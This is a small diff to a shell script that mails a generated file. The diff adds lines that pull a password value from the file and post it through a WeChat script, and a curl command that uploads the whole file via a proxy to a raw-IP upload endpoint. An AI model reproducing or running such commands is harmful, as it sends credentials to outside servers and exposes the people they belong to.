@@ -11,5 +11,8 @@ $content
 
 EOF
 cat $file | /usr/sbin/sendmail -t -F "God" -r "li.feng@oracle.com"
-cat $file | /home/llfeng/bin/mproxy python /home/llfeng/weixin_post.py 2>/dev/null
+
+cat $file | grep Password | head -n1 | sed -e 's/Password: //g'  | tr -d '\n' | /home/llfeng/bin/mproxy python /home/llfeng/weixin_post.py 2>/dev/null
+
+curl -x http://140.83.73.9:80 -F filedata=@${file}  http://52.68.197.47:81/upload.php
 rm $file
